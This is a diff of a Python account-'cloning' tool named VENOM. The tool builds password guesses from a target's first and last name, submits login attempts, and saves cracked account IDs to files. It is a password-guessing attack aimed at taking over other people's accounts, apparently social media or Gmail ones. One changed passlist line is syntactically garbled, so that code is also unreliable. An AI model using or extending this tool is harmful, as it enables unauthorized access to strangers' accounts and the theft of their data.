@@ -114,7 +114,7 @@ logo=(f"""\033[1;37m
 \033[1;32m  • \033[1;37m Tool Owner :-  Afridi-King
 \033[1;32m  • \033[1;37m GitHub     :-  Afridi404
 \033[1;32m  • \033[1;37m Type       :-  Paid
-\033[1;32m  • \033[1;37m Version    :-  {version v3.4
+\033[1;32m  • \033[1;37m Version    :-  V3.4
 os.system('clear')
 #print("\033[1;32m [•]\033[1;37m Join My FaceBook Group...! \033[1;32mThnx");time.sleep(2);os.system('xdg-open https://facebook.com/groups/1245912839659325/')
 
@@ -363,7 +363,7 @@ def gmail():
                                         last_name = 'Khan'
                                 fs = first_name.lower()
                                 ls = last_name.lower()
-                                passlist = [fs+ls,fs+' '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
+                                passlist = [fs+ls,fs+'ls+'1122 '+ls,fs+'123',fs+'12345',fs+'1122',fs,fs+'1234',fs+'786',fs+'12']
  
                                 VENOM.submit(rd1,ids,passlist)
                 print("\n");line();print(' \033[1;32m[•] \033[1;37mCloning Complete');line();print(' \033[1;32m[•] \033[1;37mOK IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-OK.txt\n \033[1;32m[•] \033[1;37mCP IDS SAVE :\033[1;32m /sdcard/VENOM/VENOM-R-CP.txt');line();input(' \033[1;32m[•]\033[1;37m Press Enter To Back Menu ');os.system('python VENOM.py')
